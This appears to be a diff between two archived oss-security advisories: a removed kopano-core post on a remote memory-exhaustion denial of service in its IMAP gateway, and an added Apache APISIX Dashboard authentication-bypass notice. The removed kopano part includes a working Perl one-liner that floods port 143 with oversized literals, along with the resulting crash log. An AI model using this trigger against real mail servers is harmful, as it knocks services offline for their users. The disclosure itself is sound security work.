@@ -1,50 +1,32 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/01/1
-Message-ID: <p883nn87-4nrq-8060-88p-70o27nr6n0r2@inai.de>
-Date: Sat, 1 May 2021 17:07:37 +0200 (CEST)
-From: Jan Engelhardt <jengelh@...i.de>
-To: oss-security@...ts.openwall.com
-Subject: kopano-core 11.0.1.143: Remote DoS with resource exhaustion
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/12/27/1
+Message-ID: <CAMikTu7OC1+SN_nOMEcSdFoE7EVmVKYt56WctqQe+nDYqMkAVA@mail.gmail.com>
+Date: Mon, 27 Dec 2021 22:25:04 +0800
+From: JunXu Chen <chenjunxu@...che.org>
+To: announce@...che.org, dev@...six.apache.org,  oss-security@...ts.openwall.com, 朱禹成 <zhuyucheng@...nbaotech.cn>
+Subject: CVE-2021-45232: Apache APISIX Dashboard: security vulnerability on unauthorized access
 Content-Type: text/plain; charset=utf-8
 
+Severity: high
 
-To the best of my knowledge, this is the initial publication,
-and there is no CVE number as of this time.
+Description:
 
+In Apache APISIX Dashboard before 2.10.1, the Manager API uses two
+frameworks and introduces framework `droplet` on the basis of
+framework `gin`, all APIs and authentication middleware are developed
+based on framework `droplet`, but some API directly use the interface
+of framework `gin` thus bypassing the authentication.
 
-# Affected versions
+Mitigation:
 
-  * kopano-core 8.5 to 11.0.1.143
+Implement one of the following mitigation techniques:
 
-The "kopano-gateway" program implements a network service for IMAP.
-By default, a generous buffer is allocated for string literals, so
-the service can be triggered to go into an out-of-memory condition.
-OOM appears to be handled (log msg with "Cannot allocate memory"),
-but not _consistently_, letting std::bad_alloc escape somewhere,
-terminating the process and denying further access to the service.
+1. Upgrade to release 2.10.1
 
+2. Change the default username and password, restrict the source IP to
+access the Apache APISIX Dashboard
 
-# Trigger
+Credit:
 
-» ./kopano-gateway -F &
-» perl -MIO::Socket::INET -e 
-  '$a="A"x65536;for(1..99){$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,143);
-  $s->write("K {134217727}\r\n");$s->write($a) for 1..2048;push@k,$s;}'
+Independently discovered by ZHU Yucheng of YuanbaoTeach Security Team.
 
-2021-05-01T17:00:03.424598: [error  ] Failed to read line: Cannot allocate memory
-2021-05-01T17:00:40.489165: [crit   ] ----------------------------------------------------------------------
-2021-05-01T17:00:40.489174: [crit   ] Fatal error detected. Please report all following information.
-2021-05-01T17:00:40.489186: [crit   ] kopano-dagent 11.0.1
-2021-05-01T17:00:40.489210: [crit   ] OS: openSUSE Tumbleweed (Linux 5.12.0-3.g6208a83-default x86_64)
-2021-05-01T17:00:40.489217: [crit   ] Thread name: kopano-gateway
-2021-05-01T17:00:40.489429: [crit   ] Peak RSS: 3056660
-2021-05-01T17:00:40.489444: [crit   ] Pid 31604 caught SIGABRT (6), out of memory or unhandled exception, traceback:
-terminate called after throwing an instance of 'std::bad_alloc'
-  what():  std::bad_alloc
-
-
-# Mitigation
-
-A reduction of the buffer (gateway.cfg:imap_max_messagesize) is 
-possible, but this administrative action equally implies a reduction of 
-the service capabilities offered to end-users (and may be unpopular).
